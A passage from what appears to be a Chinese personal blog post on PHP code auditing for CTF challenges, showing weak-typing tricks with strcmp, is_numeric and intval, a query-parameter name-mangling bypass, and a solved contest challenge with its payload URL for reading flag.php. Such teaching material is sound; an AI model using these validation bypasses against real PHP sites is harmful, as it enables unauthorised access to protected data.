<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strcmp(<span class="string">"foo"</span>, <span class="keyword">array</span>()) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br><span class="line">strcmp(<span class="string">"foo"</span>, <span class="keyword">new</span> stdClass) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br><span class="line">strcmp(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;, <span class="string">""</span>) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br></pre></td></tr></table></figure>

<h2 id="is-numeric-intval"><a href="#is-numeric-intval" class="headerlink" title="is_numeric()/intval()"></a>is_numeric()/intval()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727150632061.png" alt="image-20200727150632061"></p>
<p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。</p>
<p>第二个函数is_numeric()判断是否为数字，因为PHP的弱类型，将数字后面加上<strong>空格</strong>或者<strong>任意一个字符</strong>即可绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">233333</span>);       <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333'</span>);    <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">0x233333</span>);    <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'0x233333'</span>);   <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333abc'</span>);  <span class="comment"># 0</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">ctf不能是纯数字，但是要大于<span class="number">87654321</span></span><br><span class="line">ctf[]=<span class="number">9999999999</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727150937984.png" alt="image-20200727150937984"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">num=<span class="number">2e4</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$num=<span class="string">'2e4'</span>;                                字符串</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"intval('2e4') = "</span>.intval($num));         intval(<span class="string">'2e4'</span>) = <span class="number">2</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"'2e4'+1 = "</span>;                             <span class="string">'2e4'</span>+<span class="number">1</span> = float(<span class="number">20001</span>)</span><br><span class="line">var_dump(($num+<span class="number">1</span>));</span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"intval('2e4'+1) = "</span>.intval($num+<span class="number">1</span>));       intval(<span class="string">'2e4'</span>+<span class="number">1</span>) = <span class="number">20001</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"you pass!"</span>);                            you pass! </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>int转string：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$var = <span class="number">5</span>;  </span><br><span class="line">方式<span class="number">1</span>：$item = (string)$var;  </span><br><span class="line">方式<span class="number">2</span>：$item = strval($var);</span><br></pre></td></tr></table></figure>

<p>string转int：intval()函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(<span class="string">'2'</span>)) <span class="comment">//2  </span></span><br><span class="line">var_dump(intval(<span class="string">'3abcd'</span>)) <span class="comment">//3  </span></span><br><span class="line">var_dump(intval(<span class="string">'abcd'</span>)) <span class="comment">//0</span></span><br></pre></td></tr></table></figure>

<p>intval函数用于将输入的变量转换为整形，对于32位系统来说，int的范围为-2147483648~2147483647，当输入的数大于2147483647时，转换结果为2147483647，即</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="number">2147483647</span>+x)=<span class="number">2147483647</span></span><br><span class="line">x&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>



















































<p>当代码中存在<em>$_<strong><strong>REQUEST[‘</strong></strong>user_id’]<em>里面类似的参数的时候，我们在url上可以这样</em>a.php?user.id*传参去进行绕过,这样进去之后也能表示</em>$_REQUEST[‘user_id’]*的值，同样可以绕过的符号还有+，[ 等，应该说是php的一个小特性</p>
<p>安恒月赛 奇怪的恐龙特性</p>
<p>题目源码：</p>
<p>\1.    &lt;?php</p>
<p>\2.    highlight_file(<strong>FILE</strong>);</p>
<p>\3.    ini_set(“display_error”, false); </p>
<p>\4.    error_reporting(0); </p>
<p>\5.    $str = isset($_GET[‘A_A’])?$_GET[‘A_A’]:’A_A’;</p>
<p>\6.    if (strpos($_SERVER[‘QUERY_STRING’], “A_A”) !==false) {</p>
<p>\7.      echo ‘A_A,have fun’;</p>
<p>\8.    }</p>
<p>\9.    elseif ($str&lt;9999999999) {</p>
<p>\10.    echo ‘A_A,too small’;</p>
<p>\11.  }</p>
<p>\12.  elseif ((string)$str&gt;0) {</p>
<p>\13.    echo ‘A_A,too big’;</p>
<p>\14.  }</p>
<p>\15.  else{</p>
<p>\16.    echo file_get_contents(‘flag.php’);</p>
<p>\17.   </p>
<p>\18.  }</p>
<p>\19.  ?&gt;</p>
<p>阅读代码发现，首先第一步要绕过A_A这个符号，如果出现这个符号他就会显示A_A,have fun，就不能继续往下面执行到file_get_contents(‘flag.php’)了，但是我们发送get参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用A.A或者是A+A去传参去绕过。<br> 下面的代码就是常规的数字绕过了，但这里也用到了一个trick，就是无论你的数字多大，对于数组而言总是比数组小。</p>
<p>利用数组去绕过$str&lt;9999999999的特性，下面一个判断是强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为“admin”== 0 ，结果是true，直接等于0绕过即可，所以这题的payload<br> <code>http://101.71.29.5:10007/?A+A[]=admin</code></p>
<h4 id="绕过disable-function的方法"><a href="#绕过disable-function的方法" class="headerlink" title="绕过disable_function的方法"></a>绕过disable_function的方法</h4></div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">zhiliya</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">http://yoursite.com/2019/11/15/3 PHP代码审计/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://yoursite.com">zhiliya的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/PHP/">PHP</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD-putenv-打一套组合拳，既能绕过-open-basedir，又能绕过-disable-functions"><span class="toc-number">1.</span> <span class="toc-text">LD_PRELOAD+putenv 打一套组合拳，既能绕过 open basedir，又能绕过 disable functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-open-basedir-限制操作文件的方法"><span class="toc-number">2.</span> <span class="toc-text">绕过 open_basedir 限制操作文件的方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP弱类型"><span class="toc-number"></span> <span class="toc-text">PHP弱类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Strops"><span class="toc-number">1.</span> <span class="toc-text">Strops</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#坑"><span class="toc-number">2.</span> <span class="toc-text">坑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ereg函数漏洞-00截断"><span class="toc-number">3.</span> <span class="toc-text">ereg函数漏洞   00截断</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#变量覆盖"><span class="toc-number"></span> <span class="toc-text">变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#可变变量引起的变量覆盖"><span class="toc-number"></span> <span class="toc-text">可变变量引起的变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数引起的变量覆盖"><span class="toc-number"></span> <span class="toc-text">函数引起的变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extract"><span class="toc-number">1.</span> <span class="toc-text">extract()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-str-变量覆盖"><span class="toc-number">2.</span> <span class="toc-text">parse_str 变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-switch"><span class="toc-number"></span> <span class="toc-text">13.switch()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unset"><span class="toc-number"></span> <span class="toc-text">unset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-in-array"><span class="toc-number"></span> <span class="toc-text">14.in_array()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#serialize-和-unserialize漏洞"><span class="toc-number"></span> <span class="toc-text">serialize 和 unserialize漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#例1"><span class="toc-number"></span> <span class="toc-text">例1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例2"><span class="toc-number"></span> <span class="toc-text">例2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-反序列化漏洞"><span class="toc-number"></span> <span class="toc-text">session 反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码执行漏洞"><span class="toc-number"></span> <span class="toc-text">代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-number"></span> <span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#assert"><span class="toc-number"></span> <span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace"><span class="toc-number"></span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-match"><span class="toc-number"></span> <span class="toc-text">preg_match()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#数组绕过-返回是0-false"><span class="toc-number">0.1.</span> <span class="toc-text">数组绕过 返回是0 false</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#正则匹配绕过"><span class="toc-number">0.2.</span> <span class="toc-text">正则匹配绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PCRE回溯次数限制-返回是0-false"><span class="toc-number">0.3.</span> <span class="toc-text">PCRE回溯次数限制  返回是0 false</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#换行符（-不会匹配换行符）"><span class="toc-number">0.4.</span> <span class="toc-text">换行符（.不会匹配换行符）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func"><span class="toc-number"></span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态函数执行-GET-39-a-39-GET-39-b-39"><span class="toc-number"></span> <span class="toc-text">动态函数执行  $_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp-比较数组和字符串的时候，返回是0-false-两者相等"><span class="toc-number"></span> <span class="toc-text">strcmp  比较数组和字符串的时候，返回是0 false 两者相等</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric-intval"><span class="toc-number"></span> <span class="toc-text">is_numeric()&#x2F;intval()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#绕过disable-function的方法"><span class="toc-number">0.1.</span> <span class="toc-text">绕过disable_function的方法</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2019/11/15/%E6%80%BB/">&lt; 总</a><a class="next" href="/2019/11/15/unctf/">unctf &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2023 <a href="/." rel="nofollow">zhiliya</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>